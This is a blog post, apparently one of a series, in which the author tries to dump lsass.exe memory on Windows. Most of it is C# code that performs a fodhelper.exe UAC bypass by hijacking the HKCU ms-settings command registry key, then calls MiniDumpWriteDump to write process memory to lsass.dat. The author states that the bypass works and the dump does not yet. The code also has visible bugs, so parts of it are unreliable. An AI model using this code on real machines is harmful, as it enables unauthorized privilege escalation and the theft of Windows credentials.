# Dumping lsass.exe memory - Part 2

This is again a **failed** post, but I came accross new stuff to research on. So apparently I found a way to form UAC bypass but inorder to test my theory, I need to run the memory dump function in context of elevated process.

## What now?

- I need to use some sort of IPC to communicate accross medium integrity and high integrity process. 
- IPC exsists in multiple way in windows, i.e you can use shared pipes which medium inegrity process writes to pipe which is read by high integrity process and executes it.
- You can also use shared memory region, RPC or COM for the need but these are bit complicated to code for.

Code :
```c#
using System;
using System.Management;
using System.Management.Instrumentation;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;

class Program
{
    [DllImport("dbghelp")]
    private static extern bool MiniDumpWriteDump(IntPtr hProcess, UInt32 ProcessId, SafeHandle hFile, UInt32 dumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

    //Perform UAC bypass using fodhelper
    static void ByPassUAC(string command)
    {
        //UAC Bypass using fodhelper.exe
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command / v DelegateExecute / t REG_SZ
        //REG ADD HKCU\Software\Classes\ms - settings\Shell\Open\command / d "cmd.exe" / f

        RegistryKey myKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
        if (myKey == null)
        {
            RegistryKey tmpKey = Registry.CurrentUser.CreateSubKey(@"Software\\Classes\\ms-settings\\shell\\open\\command");
            tmpKey.Close();
        }
        myKey.Close();
        RegistryKey Key = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command",true);
        Key.SetValue("DelegateExecute", "REG_SZ");
        Key.SetValue("", command);
        return;
    }

    //Start a fodhelper.exe process
    static Process ActivateProcess(string name)
    {
        Process p = new Process();
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.FileName = name;
        p.Start();
        return p;
    }
    //Return the process id the process spawned by running fodhelper.exe i.e the cmd.exe running with elevated privs.
    // Refer : https://stackoverflow.com/questions/17922725/monitor-child-processes-of-a-process

    static int GetChildProcess(Process parentProcess)
    {
        int i = 0;
        ManagementObjectSearcher mo = new ManagementObjectSearcher(String.Format("Select * from Win32_Process Where ParentProcessID={0}", parentProcess.Id));
        return Convert.ToInt32(mo.Get()[0]["ProcessID"]);
    }

    static void WriteMem(Process p)
    {
        FileStream fs = new FileStream("lsass.dat", FileMode.Create);

        bool status = MiniDumpWriteDump(p.Handle, (UInt32)p.Id, fs.SafeFileHandle, (UInt32)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (status)
        {
            System.Console.WriteLine("Done!");
            fs.Close();
            System.Console.ReadLine();
        }
        else
        {
            System.Console.WriteLine("[!] Error dumping the process");
        }
        return;
    }

    static void Main(string[] args)
    {

        ByPassUAC("cmd.exe");
        Process p = ActivateProcess("C:\\Windows\\System32\\fodhelper.exe");
        GetChildProcess(p);
        WriteMem(p);
        return;
    }
}
```
As of now the code wont work since there is no dumping run in context on elevated process. But the same snippet can be used to perform UAC bypass in c#.

So considering todays progress I would find ways to run `WriteMem` in context of elvated process.
